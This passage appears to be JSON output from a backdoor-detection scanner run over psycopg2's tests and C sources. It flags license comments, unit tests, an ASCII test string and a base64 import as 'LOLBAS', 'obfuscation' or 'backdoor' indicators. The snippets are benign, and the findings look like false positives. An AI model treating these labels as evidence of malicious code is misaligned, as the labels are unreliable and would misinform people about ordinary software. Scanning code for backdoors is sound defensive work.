                    "text": "                cur.execute(\"rollback to savepoint x;\")\n\n        # ...not too many errors! in the above collate there are 17 errors:\n        # assume in other collates we won't find more than 30\n        self.assert_(errs < 30,\n            \"too many collate errors. Is the test working?\")\n\n",
                    "rendered": {
                      "text": "                cur.execute(\"rollback to savepoint x;\")\n\n        # ...not too many errors! in the above collate there are 17 errors:\n        # assume in other collates we won't find more than 30\n        self.assert_(errs < 30,\n            \"too many collate errors. Is the test working?\")\n\n",
                      "markdown": "`                cur.execute(\"rollback to savepoint x;\")\n\n        # ...not too many errors! in the above collate there are 17 errors:\n        # assume in other collates we won't find more than 30\n        self.assert_(errs < 30,\n            \"too many collate errors. Is the test working?\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_extras.py"
                },
                "region": {
                  "startLine": 173,
                  "startColumn": 63,
                  "endLine": 173,
                  "endColumn": 67,
                  "snippet": {
                    "text": "\n    def test_adapt_9(self):\n        if self.conn.info.server_version < 90000:\n            return self.skipTest(\"skipping dict adaptation with PG 9 syntax\")\n\n        o = {'a': '1', 'b': \"'\", 'c': None}\n        if self.conn.encoding == 'UTF8':\n",
                    "rendered": {
                      "text": "\n    def test_adapt_9(self):\n        if self.conn.info.server_version < 90000:\n            return self.skipTest(\"skipping dict adaptation with PG 9 syntax\")\n\n        o = {'a': '1', 'b': \"'\", 'c': None}\n        if self.conn.encoding == 'UTF8':\n",
                      "markdown": "`\n    def test_adapt_9(self):\n        if self.conn.info.server_version < 90000:\n            return self.skipTest(\"skipping dict adaptation with PG 9 syntax\")\n\n        o = {'a': '1', 'b': \"'\", 'c': None}\n        if self.conn.encoding == 'UTF8':\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_extras.py"
                },
                "region": {
                  "startLine": 149,
                  "startColumn": 63,
                  "endLine": 149,
                  "endColumn": 67,
                  "snippet": {
                    "text": "class HstoreTestCase(ConnectingTestCase):\n    def test_adapt_8(self):\n        if self.conn.info.server_version >= 90000:\n            return self.skipTest(\"skipping dict adaptation with PG pre-9 syntax\")\n\n        o = {'a': '1', 'b': \"'\", 'c': None}\n        if self.conn.encoding == 'UTF8':\n",
                    "rendered": {
                      "text": "class HstoreTestCase(ConnectingTestCase):\n    def test_adapt_8(self):\n        if self.conn.info.server_version >= 90000:\n            return self.skipTest(\"skipping dict adaptation with PG pre-9 syntax\")\n\n        o = {'a': '1', 'b': \"'\", 'c': None}\n        if self.conn.encoding == 'UTF8':\n",
                      "markdown": "`class HstoreTestCase(ConnectingTestCase):\n    def test_adapt_8(self):\n        if self.conn.info.server_version >= 90000:\n            return self.skipTest(\"skipping dict adaptation with PG pre-9 syntax\")\n\n        o = {'a': '1', 'b': \"'\", 'c': None}\n        if self.conn.encoding == 'UTF8':\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_extras.py"
                },
                "region": {
                  "startLine": 446,
                  "startColumn": 12,
                  "endLine": 446,
                  "endColumn": 76,
                  "snippet": {
                    "text": "           '~,\\x7f)',\n           list(map(chr, range(1, 128))))\n        ok('(,\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f'\n           '\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !'\n           '\"\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\\\\\]'\n           '^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\")',\n           [None, ''.join(map(chr, range(1, 128)))])\n",
                    "rendered": {
                      "text": "           '~,\\x7f)',\n           list(map(chr, range(1, 128))))\n        ok('(,\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f'\n           '\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !'\n           '\"\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\\\\\]'\n           '^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\")',\n           [None, ''.join(map(chr, range(1, 128)))])\n",
                      "markdown": "`           '~,\\x7f)',\n           list(map(chr, range(1, 128))))\n        ok('(,\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f'\n           '\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !'\n           '\"\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\\\\\]'\n           '^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\")',\n           [None, ''.join(map(chr, range(1, 128)))])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_extras.py"
                },
                "region": {
                  "startLine": 445,
                  "startColumn": 15,
                  "endLine": 445,
                  "endColumn": 47,
                  "snippet": {
                    "text": "           '^,_,`,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,{,|,},'\n           '~,\\x7f)',\n           list(map(chr, range(1, 128))))\n        ok('(,\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f'\n           '\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !'\n           '\"\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\\\\\]'\n           '^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\")',\n",
                    "rendered": {
                      "text": "           '^,_,`,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,{,|,},'\n           '~,\\x7f)',\n           list(map(chr, range(1, 128))))\n        ok('(,\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f'\n           '\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !'\n           '\"\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\\\\\]'\n           '^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\")',\n",
                      "markdown": "`           '^,_,`,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,{,|,},'\n           '~,\\x7f)',\n           list(map(chr, range(1, 128))))\n        ok('(,\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f'\n           '\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !'\n           '\"\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\\\\\]'\n           '^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\")',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_extras.py"
                },
                "region": {
                  "startLine": 446,
                  "startColumn": 12,
                  "endLine": 446,
                  "endColumn": 76,
                  "snippet": {
                    "text": "           '~,\\x7f)',\n           list(map(chr, range(1, 128))))\n        ok('(,\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f'\n           '\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !'\n           '\"\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\\\\\]'\n           '^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\")',\n           [None, ''.join(map(chr, range(1, 128)))])\n",
                    "rendered": {
                      "text": "           '~,\\x7f)',\n           list(map(chr, range(1, 128))))\n        ok('(,\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f'\n           '\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !'\n           '\"\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\\\\\]'\n           '^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\")',\n           [None, ''.join(map(chr, range(1, 128)))])\n",
                      "markdown": "`           '~,\\x7f)',\n           list(map(chr, range(1, 128))))\n        ok('(,\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f'\n           '\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !'\n           '\"\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\\\\\]'\n           '^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\")',\n           [None, ''.join(map(chr, range(1, 128)))])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_copy.py"
                },
                "region": {
                  "startLine": 380,
                  "startColumn": 45,
                  "endLine": 380,
                  "endColumn": 49,
                  "snippet": {
                    "text": "                return 1 / 0\n\n        curs = self.conn.cursor()\n        # It seems we cannot do this, but now at least we propagate the error\n        # self.assertRaises(ZeroDivisionError,\n        #     curs.copy_from, BrokenRead(), \"tcopy\")\n        try:\n",
                    "rendered": {
                      "text": "                return 1 / 0\n\n        curs = self.conn.cursor()\n        # It seems we cannot do this, but now at least we propagate the error\n        # self.assertRaises(ZeroDivisionError,\n        #     curs.copy_from, BrokenRead(), \"tcopy\")\n        try:\n",
                      "markdown": "`                return 1 / 0\n\n        curs = self.conn.cursor()\n        # It seems we cannot do this, but now at least we propagate the error\n        # self.assertRaises(ZeroDivisionError,\n        #     curs.copy_from, BrokenRead(), \"tcopy\")\n        try:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_copy.py"
                },
                "region": {
                  "startLine": 356,
                  "startColumn": 7,
                  "endLine": 356,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    @slow\n    def test_copy_to_segfault(self):\n        # issue #219\n        script = f\"\"\"import psycopg2\nconn = psycopg2.connect({dsn!r})\ncurs = conn.cursor()\ncurs.execute(\"create table copy_segf (id int)\")\n",
                    "rendered": {
                      "text": "    @slow\n    def test_copy_to_segfault(self):\n        # issue #219\n        script = f\"\"\"import psycopg2\nconn = psycopg2.connect({dsn!r})\ncurs = conn.cursor()\ncurs.execute(\"create table copy_segf (id int)\")\n",
                      "markdown": "`    @slow\n    def test_copy_to_segfault(self):\n        # issue #219\n        script = f\"\"\"import psycopg2\nconn = psycopg2.connect({dsn!r})\ncurs = conn.cursor()\ncurs.execute(\"create table copy_segf (id int)\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_copy.py"
                },
                "region": {
                  "startLine": 338,
                  "startColumn": 7,
                  "endLine": 338,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    @slow\n    def test_copy_from_segfault(self):\n        # issue #219\n        script = f\"\"\"import psycopg2\nconn = psycopg2.connect({dsn!r})\ncurs = conn.cursor()\ncurs.execute(\"create table copy_segf (id int)\")\n",
                    "rendered": {
                      "text": "    @slow\n    def test_copy_from_segfault(self):\n        # issue #219\n        script = f\"\"\"import psycopg2\nconn = psycopg2.connect({dsn!r})\ncurs = conn.cursor()\ncurs.execute(\"create table copy_segf (id int)\")\n",
                      "markdown": "`    @slow\n    def test_copy_from_segfault(self):\n        # issue #219\n        script = f\"\"\"import psycopg2\nconn = psycopg2.connect({dsn!r})\ncurs = conn.cursor()\ncurs.execute(\"create table copy_segf (id int)\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_copy.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_copy.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_bug_gc.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_bug_gc.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_extras_dictcursor.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 6,
                  "endLine": 20,
                  "snippet": {
                    "text": "# License for more details.\n\nimport copy\nimport time\nimport pickle\nimport unittest\nfrom datetime import timedelta\nfrom functools import lru_cache\n",
                    "rendered": {
                      "text": "# License for more details.\n\nimport copy\nimport time\nimport pickle\nimport unittest\nfrom datetime import timedelta\nfrom functools import lru_cache\n",
                      "markdown": "`# License for more details.\n\nimport copy\nimport time\nimport pickle\nimport unittest\nfrom datetime import timedelta\nfrom functools import lru_cache\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/column_type.c"
                },
                "region": {
                  "startLine": 73,
                  "startColumn": 69,
                  "endLine": 73,
                  "endColumn": 73,
                  "snippet": {
                    "text": "\nstatic const char table_column_doc[] =\n    \"The number (within its table) of the column making up the result\\n\\n\"\n    \"None if not available. Note that PostgreSQL column numbers start at 1\";\n\n\nstatic PyMemberDef column_members[] = {\n",
                    "rendered": {
                      "text": "\nstatic const char table_column_doc[] =\n    \"The number (within its table) of the column making up the result\\n\\n\"\n    \"None if not available. Note that PostgreSQL column numbers start at 1\";\n\n\nstatic PyMemberDef column_members[] = {\n",
                      "markdown": "`\nstatic const char table_column_doc[] =\n    \"The number (within its table) of the column making up the result\\n\\n\"\n    \"None if not available. Note that PostgreSQL column numbers start at 1\";\n\n\nstatic PyMemberDef column_members[] = {\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/typecast_binary.c"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 22,
                  "endLine": 52,
                  "endColumn": 26,
                  "snippet": {
                    "text": "chunk_repr(chunkObject *self)\n{\n    return PyString_FromFormat(\n        \"<memory chunk at %p size \" FORMAT_CODE_PY_SSIZE_T \">\",\n        self->base, self->len\n      );\n}\n",
                    "rendered": {
                      "text": "chunk_repr(chunkObject *self)\n{\n    return PyString_FromFormat(\n        \"<memory chunk at %p size \" FORMAT_CODE_PY_SSIZE_T \">\",\n        self->base, self->len\n      );\n}\n",
                      "markdown": "`chunk_repr(chunkObject *self)\n{\n    return PyString_FromFormat(\n        \"<memory chunk at %p size \" FORMAT_CODE_PY_SSIZE_T \">\",\n        self->base, self->len\n      );\n}\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/typecast_binary.c"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 47,
                  "endLine": 40,
                  "endColumn": 51,
                  "snippet": {
                    "text": "static void\nchunk_dealloc(chunkObject *self)\n{\n    Dprintf(\"chunk_dealloc: deallocating memory at %p, size \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self->base, self->len\n      );\n",
                    "rendered": {
                      "text": "static void\nchunk_dealloc(chunkObject *self)\n{\n    Dprintf(\"chunk_dealloc: deallocating memory at %p, size \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self->base, self->len\n      );\n",
                      "markdown": "`static void\nchunk_dealloc(chunkObject *self)\n{\n    Dprintf(\"chunk_dealloc: deallocating memory at %p, size \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self->base, self->len\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/xid_type.c"
                },
                "region": {
                  "startLine": 353,
                  "startColumn": 15,
                  "endLine": 353,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\nexit:\n    Py_XDECREF(func);\n    Py_XDECREF(base64);\n\n    return rv;\n}\n",
                    "rendered": {
                      "text": "\nexit:\n    Py_XDECREF(func);\n    Py_XDECREF(base64);\n\n    return rv;\n}\n",
                      "markdown": "`\nexit:\n    Py_XDECREF(func);\n    Py_XDECREF(base64);\n\n    return rv;\n}\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/xid_type.c"
                },
                "region": {
                  "startLine": 344,
                  "startColumn": 40,
                  "endLine": 344,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    PyObject *rv = NULL;\n\n    if (!(base64 = PyImport_ImportModule(\"base64\"))) { goto exit; }\n    if (!(func = PyObject_GetAttrString(base64, funcname))) { goto exit; }\n\n    Py_INCREF(s);\n    if (!(s = psyco_ensure_bytes(s))) { goto exit; }\n",
                    "rendered": {
                      "text": "    PyObject *rv = NULL;\n\n    if (!(base64 = PyImport_ImportModule(\"base64\"))) { goto exit; }\n    if (!(func = PyObject_GetAttrString(base64, funcname))) { goto exit; }\n\n    Py_INCREF(s);\n    if (!(s = psyco_ensure_bytes(s))) { goto exit; }\n",
                      "markdown": "`    PyObject *rv = NULL;\n\n    if (!(base64 = PyImport_ImportModule(\"base64\"))) { goto exit; }\n    if (!(func = PyObject_GetAttrString(base64, funcname))) { goto exit; }\n\n    Py_INCREF(s);\n    if (!(s = psyco_ensure_bytes(s))) { goto exit; }\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/xid_type.c"
                },
                "region": {
                  "startLine": 343,
                  "startColumn": 42,
                  "endLine": 343,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    PyObject *func = NULL;\n    PyObject *rv = NULL;\n\n    if (!(base64 = PyImport_ImportModule(\"base64\"))) { goto exit; }\n    if (!(func = PyObject_GetAttrString(base64, funcname))) { goto exit; }\n\n    Py_INCREF(s);\n",
                    "rendered": {
                      "text": "    PyObject *func = NULL;\n    PyObject *rv = NULL;\n\n    if (!(base64 = PyImport_ImportModule(\"base64\"))) { goto exit; }\n    if (!(func = PyObject_GetAttrString(base64, funcname))) { goto exit; }\n\n    Py_INCREF(s);\n",
                      "markdown": "`    PyObject *func = NULL;\n    PyObject *rv = NULL;\n\n    if (!(base64 = PyImport_ImportModule(\"base64\"))) { goto exit; }\n    if (!(func = PyObject_GetAttrString(base64, funcname))) { goto exit; }\n\n    Py_INCREF(s);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/xid_type.c"
                },
                "region": {
                  "startLine": 343,
                  "startColumn": 10,
                  "endLine": 343,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    PyObject *func = NULL;\n    PyObject *rv = NULL;\n\n    if (!(base64 = PyImport_ImportModule(\"base64\"))) { goto exit; }\n    if (!(func = PyObject_GetAttrString(base64, funcname))) { goto exit; }\n\n    Py_INCREF(s);\n",
                    "rendered": {
